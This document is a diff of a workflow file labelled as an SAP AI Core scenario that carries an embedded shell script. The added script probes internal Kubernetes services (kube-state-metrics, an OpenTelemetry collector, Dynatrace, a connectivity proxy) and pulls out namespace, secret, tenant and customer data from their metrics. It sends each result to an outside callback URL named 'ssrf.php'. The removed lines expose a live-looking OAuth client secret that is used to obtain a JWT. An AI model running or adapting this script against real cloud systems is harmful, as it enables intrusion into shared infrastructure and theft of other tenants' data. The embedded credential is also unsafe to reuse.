@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "44.0.0"
+    ai.sap.com/version: "45.0.0"
 spec:
   entrypoint: main
   templates:
@@ -25,58 +25,102 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/ssrf.php"
+
+        # 1. KSM (kube-state-metrics) - cluster state exposure
+        echo "=== KSM PROBING ===" >&2
+        for svc in ksm-custom-kube-state-metrics ksm-multi-kube-state-metrics ksm-pods-kube-state-metrics; do
+          ip=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
+          if [ -n "$ip" ]; then
+            curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-ksm-${svc}-ip" -d "IP: $ip" 2>/dev/null
+            for port in 8080 8443 80 443 9090; do
+              R=$(curl -sk --connect-timeout 3 "http://${ip}:${port}/metrics" 2>&1 | head -c 500)
+              if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|reset\|timed out"; then
+                curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-ksm-${svc}-${port}" -d "$R" 2>/dev/null
+                # Get namespace metrics specifically
+                NS=$(curl -sk --connect-timeout 3 "http://${ip}:${port}/metrics" 2>&1 | grep -i "kube_namespace\|kube_secret\|kube_pod_info" | head -c 2000)
+                [ -n "$NS" ] && curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-ksm-${svc}-${port}-ns" -d "$NS" 2>/dev/null
+              fi
+            done
+            # Try healthz too
+            R=$(curl -sk --connect-timeout 3 "http://${ip}:8080/healthz" 2>&1 | head -c 200)
+            [ -n "$R" ] && curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-ksm-${svc}-healthz" -d "$R" 2>/dev/null
+          else
+            curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-ksm-${svc}-nxdomain" -d "NXDOMAIN" 2>/dev/null
+          fi
+        done
+
+        # 2. OTEL collector metrics - look for tenant/namespace data
+        echo "=== OTEL METRICS ===" >&2
+        OTEL_IP=$(dig +short "otel-collector.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
+        curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-otel-dns" -d "otel-collector IP: $OTEL_IP" 2>/dev/null
+
+        if [ -n "$OTEL_IP" ]; then
+          # Port 8888 metrics - extract k8s labels, namespaces, secrets
+          METRICS=$(curl -sk --connect-timeout 5 "http://${OTEL_IP}:8888/metrics" 2>&1)
+          SIZE=$(echo "$METRICS" | wc -c)
+          curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-otel-8888-size" -d "Size: $SIZE bytes" 2>/dev/null
+
+          # Extract namespace references
+          echo "$METRICS" | grep -i "namespace" | sort -u | head -c 3000 | \
+            curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-otel-namespaces" -d @- 2>/dev/null
+
+          # Extract k8s pod/resource labels
+          echo "$METRICS" | grep -i "k8s\|kube\|pod\|secret\|deployment" | sort -u | head -c 3000 | \
+            curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-otel-k8s-labels" -d @- 2>/dev/null
+
+          # Extract tenant/resource-group references
+          echo "$METRICS" | grep -i "tenant\|resource.group\|rg-\|customer\|account" | sort -u | head -c 3000 | \
+            curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-otel-tenant-refs" -d @- 2>/dev/null
+
+          # All unique metric names
+          echo "$METRICS" | grep "^# HELP" | head -c 2000 | \
+            curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-otel-metric-names" -d @- 2>/dev/null
+
+          # Port 13133 health check (includes pipeline info)
+          R=$(curl -sk --connect-timeout 3 "http://${OTEL_IP}:13133/" 2>&1 | head -c 1000)
+          curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-otel-13133" -d "$R" 2>/dev/null
+        fi
+
+        # 3. Try all 3 Feb-era OTEL IPs directly
+        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
+          R=$(curl -sk --connect-timeout 3 "http://${ip}:8888/metrics" 2>&1 | head -c 300)
+          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|reset\|timed out"; then
+            curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-feb-ip-${ip}" -d "$R" 2>/dev/null
+          fi
+        done
+
+        # 4. Dynatrace ActiveGate
+        echo "=== DYNATRACE ===" >&2
+        DYN_IP=$(dig +short "dynakube-activegate.dynatrace.svc.cluster.local" 2>/dev/null | head -1)
+        if [ -n "$DYN_IP" ]; then
+          curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-dyna-ip" -d "dynakube IP: $DYN_IP" 2>/dev/null
+          for port in 9999 443 8443 9443; do
+            R=$(curl -sk --connect-timeout 3 "https://${DYN_IP}:${port}/" 2>&1 | head -c 300)
+            [ -n "$R" ] && curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-dyna-${port}" -d "$R" 2>/dev/null
+            R2=$(curl -sk --connect-timeout 3 "http://${DYN_IP}:${port}/" 2>&1 | head -c 300)
+            [ -n "$R2" ] && curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-dyna-http-${port}" -d "$R2" 2>/dev/null
+          done
+        else
+          curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-dyna-nxdomain" -d "NXDOMAIN" 2>/dev/null
+        fi
+
+        # 5. Connectivity proxy - CONNECT tunnel attempt
+        echo "=== CONN PROXY TUNNEL ===" >&2
         CP="100.104.7.43"
-        OTEL="100.109.242.36"
-        
-        # Get JWT (no Bearer prefix)
-        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
-        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
-        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
-        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
-          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
-        echo "JWT: ${#JWT} chars" >&2
-        
-        # 1. Fix connectivity proxy token format
-        echo "=== CONN PROXY TOKEN TESTS ===" >&2
-        # No Bearer prefix - raw JWT in header
-        R1=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
-        echo "Raw JWT: $R1" >&2
-        
-        # Try different header combinations
-        R2=$(curl -sk --connect-timeout 5 -H "SAP-Connectivity-Authentication: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
-        echo "SAP-Connectivity-Auth: $R2" >&2
-        
-        R3=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
-        echo "Authorization: $R3" >&2
-        
-        R4=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" -H "Proxy-Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
-        echo "Both headers: $R4" >&2
-        
-        # 2. Probe OpenTelemetry collector
-        echo "=== OTEL COLLECTOR ===" >&2
-        for port in 4317 4318 8888 13133 55679 55680 14268 9411 1777; do
-          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:${port}/" 2>&1 | head -c 200)
-          [ -n "$R" ] && echo "OTEL:${port}: $R" >&2
+        # Try CONNECT method to reach internal services
+        R=$(curl -sk --connect-timeout 5 -x "http://${CP}:20003" "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -c 500)
+        curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-proxy-ksm" -d "$R" 2>/dev/null
+
+        # Try connectivity proxy as HTTP proxy without auth
+        R=$(curl -sk --connect-timeout 5 -x "http://${CP}:20003" "http://otel-collector.opentelemetry.svc.cluster.local:8888/metrics" 2>&1 | head -c 500)
+        curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-proxy-otel" -d "$R" 2>/dev/null
+
+        # 6. List all services in relevant namespaces via DNS SRV
+        echo "=== SRV RECORDS ===" >&2
+        for ns in opentelemetry dynatrace istio-system kube-system ai-core connectivity-proxy; do
+          SRV=$(dig +short SRV "*.${ns}.svc.cluster.local" 2>/dev/null | head -c 500)
+          [ -n "$SRV" ] && curl -sk --connect-timeout 5 -X POST "${CB}?src=v45-srv-${ns}" -d "$SRV" 2>/dev/null
         done
-        
-        # Try OTEL health/metrics
-        for path in "/v1/traces" "/v1/metrics" "/v1/logs" "/metrics" "/health" "/debug/pprof"; do
-          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4318${path}" 2>&1 | head -c 200)
-          [ -n "$R" ] && echo "OTEL:4318${path}: $R" >&2
-        done
-        
-        # Try gRPC port
-        R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4317/" 2>&1 | head -c 100)
-        echo "OTEL:4317: $R" >&2
-        
-        # 3. DNS wildcard search for ml-tracking
-        echo "=== ML-TRACKING DEEP ===" >&2
-        for svc in ml-tracking-server ml-tracking-api mlflow-server tracking-server experiment-tracking sap-ml-tracking ai-tracking; do
-          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
-        done
-        
-        # SRV records
-        dig +short SRV "*.ml-tracking.svc.cluster.local" 2>/dev/null | head -5 >&2
-        
-        echo "V44 DONE" >&2
+
+        curl -sk --connect-timeout 3 -X POST "${CB}?src=v45-done" -d "V45 COMPLETE" 2>/dev/null
+        echo "V45 DONE" >&2
